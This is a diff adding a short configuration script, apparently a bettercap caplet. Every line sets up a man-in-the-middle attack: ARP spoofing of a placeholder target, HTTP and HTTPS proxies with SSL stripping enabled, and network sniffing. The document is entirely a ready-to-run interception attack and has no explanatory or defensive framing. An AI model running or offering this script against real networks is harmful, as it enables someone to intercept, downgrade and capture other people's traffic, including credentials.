@@ -1,0 +1,11 @@
+set arp.spoof.fullduplex true
+set arp.spoof.targets TARGET_PLACEHOLDER
+set net.sniff.local true
+
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+
+arp.spoof on
+http.proxy on
+https.proxy on
+net.sniff on
